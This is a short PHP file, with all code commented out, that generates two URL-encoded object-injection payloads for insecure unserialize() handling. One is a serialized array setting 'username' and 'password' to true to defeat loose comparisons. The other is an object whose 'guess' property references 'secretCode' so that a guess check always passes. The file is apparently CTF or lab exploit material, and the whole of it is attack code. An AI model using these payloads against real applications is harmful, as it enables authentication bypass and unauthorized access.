<?php
// Object injection
// $payload= [
//     "username" => true,
//     "password" => true
//     ];
// print urlencode(serialize($payload));



// Object injection
// class ObjectExample {
//     public $secretCode;
//     public $guess;

//     public function __construct()
//     {
//         $this->secretCode = null;
//         $this->guess = &$this->secretCode;
//     }
// }

// $obj = new ObjectExample();
// print urlencode(serialize($obj));